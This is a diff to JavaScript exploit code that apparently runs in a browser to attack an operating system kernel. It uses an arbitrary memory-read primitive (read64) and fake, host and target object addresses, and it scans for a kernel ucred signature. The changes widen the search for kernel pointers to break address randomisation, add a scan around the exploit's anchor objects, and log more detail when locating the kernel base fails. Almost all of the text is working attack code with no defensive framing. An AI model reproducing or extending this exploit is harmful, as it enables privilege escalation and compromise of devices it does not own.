@@ -526,7 +526,7 @@ var SURVIVE_MS = (function(){
 })();
 var FORCE_UCRED_SIG_SCAN = Q.get("ksig") === "1";
 
-var REVISION = "genuine-u8-rw-24-1352";
+var REVISION = "genuine-u8-rw-25-1352";
 var K = 2;
 var DUPLICATE_INDEX = 2;
 var CONTROL_INDEX = 0xffff;
@@ -781,12 +781,7 @@ var KPTR_ALIGN_MASK = ~0x1fffffn;
 function kernelImageBaseCandidate(b) {
     if (!kptrBig(b)) return false;
     if ((b & 0x1fffffn) !== 0n) return false;
-    var i;
-    for (i = 0; i < KBASE_LINK_BASES.length; i++) {
-        var lo = KBASE_LINK_BASES[i];
-        if (b >= lo && b <= lo + KBASE_SLIDE_MAX + 0x4000000n) return true;
-    }
-    return b >= 0xffffffff80000000n && b <= 0xffffffffa0000000n;
+    return b >= 0xffffffff80000000n && b <= 0xffffffff90000000n;
 }
 
 function deriveKbaseCandidatesFromKptr(k) {
@@ -811,18 +806,17 @@ function deriveKbaseCandidatesFromKptr(k) {
 }
 
 function userlandKptrScanRanges() {
-    var half = parseHexBig(Q.get("kbspan"), 0x600000n);
+    var half = parseHexBig(Q.get("kbspan"), 0x1000000n);
     var spans = [];
-    if (isFinite(fakeAddress) && fakeAddress > 0) {
-        var lo = BigInt(Math.max(8, Math.floor(fakeAddress) - Number(half)));
-        var hi = BigInt(Math.floor(fakeAddress + Number(half)));
-        spans.push({ lo: lo, hi: hi, tag: "heap-anchor" });
+    function addAnchor(name, addr) {
+        if (!isFinite(addr) || addr <= 0) return;
+        var lo = BigInt(Math.max(8, Math.floor(addr) - Number(half)));
+        var hi = BigInt(Math.floor(addr + Number(half)));
+        spans.push({ lo: lo, hi: hi, tag: name });
     }
-    if (isFinite(hostAddress) && hostAddress > 0) {
-        var lo2 = BigInt(Math.max(8, Math.floor(hostAddress) - Number(half)));
-        var hi2 = BigInt(Math.floor(hostAddress + Number(half)));
-        spans.push({ lo: lo2, hi: hi2, tag: "host-anchor" });
-    }
+    addAnchor("fake-anchor", fakeAddress);
+    addAnchor("host-anchor", hostAddress);
+    addAnchor("target-anchor", targetAddress);
     var skipLib = Q.get("kbscanlib") !== "1";
     if (Q.get("kbskiplib") === "0") skipLib = false;
     if (Q.get("kbskiplib") === "1") skipLib = true;
@@ -832,9 +826,32 @@ function userlandKptrScanRanges() {
     return spans;
 }
 
+function scanExploitRootsForKptr(recordKptr) {
+    var anchors = [];
+    if (isFinite(fakeAddress) && fakeAddress > 0) anchors.push(BigInt(Math.floor(fakeAddress)));
+    if (isFinite(hostAddress) && hostAddress > 0) anchors.push(BigInt(Math.floor(hostAddress)));
+    if (isFinite(targetAddress) && targetAddress > 0) anchors.push(BigInt(Math.floor(targetAddress)));
+    var found = 0;
+    for (var a = 0; a < anchors.length; a++) {
+        var base = anchors[a];
+        for (var off = -0x400n; off <= 0x1000n; off += 8n) {
+            var addr = base + off;
+            if (addr <= 0n) continue;
+            try {
+                var val = read64(addr);
+                if (kptrBig(val)) {
+                    recordKptr(val);
+                    found++;
+                }
+            } catch (_) {}
+        }
+    }
+    mark("KPTR-ROOT-SCAN", "anchors=" + anchors.length + "-kptr=" + found);
+}
+
 function findKbaseViaUserlandKptrAsync(done) {
     var ranges = userlandKptrScanRanges();
-    var step = parseHexBig(Q.get("kptrstep"), 0x80n);
+    var step = parseHexBig(Q.get("kptrstep"), 0x40n);
     if (step < 8n) step = 8n;
     var chunk = parseInt(Q.get("kptrchunk") || "384", 10);
     if (!isFinite(chunk) || chunk < 32) chunk = 384;
@@ -842,6 +859,7 @@ function findKbaseViaUserlandKptrAsync(done) {
 
     var votes = {};
     var kptrHits = 0;
+    var rawKptrSamples = [];
     var rangeIdx = 0;
     var cur = 0n;
     var dbgMode = Q.get("dbg") === "1";
@@ -851,6 +869,7 @@ function findKbaseViaUserlandKptrAsync(done) {
 
     function recordKptr(k) {
         kptrHits++;
+        if (rawKptrSamples.length < 12) rawKptrSamples.push(k);
         var cands = deriveKbaseCandidatesFromKptr(k);
         for (var i = 0; i < cands.length; i++) {
             var key = cands[i].toString(16);
@@ -858,6 +877,8 @@ function findKbaseViaUserlandKptrAsync(done) {
         }
         if (dbgMode && kptrHits <= 8) mark("KPTR-HIT", hex(k));
     }
+
+    scanExploitRootsForKptr(recordKptr);
 
     function finishKptrScan() {
         mark("KPTR-SCAN-DONE", "kptrs=" + kptrHits);
@@ -869,7 +890,13 @@ function findKbaseViaUserlandKptrAsync(done) {
             }
         }
         if (bestKey == null || bestVotes < 1) {
-            mark("KBASE-KPTR-FAIL", "no-derived-base");
+            if (kptrHits === 0) {
+                mark("KBASE-KPTR-FAIL", "no-kptr-in-heap");
+                mark("KBASE-NEXT", "need-syscall-leak-poops-or-kb-manual");
+            } else {
+                mark("KBASE-KPTR-FAIL", "kptrs=" + kptrHits + "-no-derived-base");
+                mark("KPTR-RAW-SAMPLES", rawKptrSamples.slice(0, 6).map(hex).join(","));
+            }
             done(null);
             return;
         }
